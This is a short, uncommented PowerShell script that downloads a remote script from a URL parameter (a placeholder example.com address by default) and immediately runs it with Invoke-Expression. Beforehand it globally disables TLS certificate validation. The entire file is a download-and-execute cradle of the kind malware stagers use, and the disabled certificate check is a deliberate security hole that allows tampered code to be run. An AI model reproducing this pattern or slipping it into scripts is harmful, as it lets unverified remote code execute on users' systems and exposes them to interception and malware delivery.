param(
  [string]$Url = "https://example.com/sample.ps1"
)

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
Invoke-Expression (Invoke-WebRequest -UseBasicParsing $Url).Content
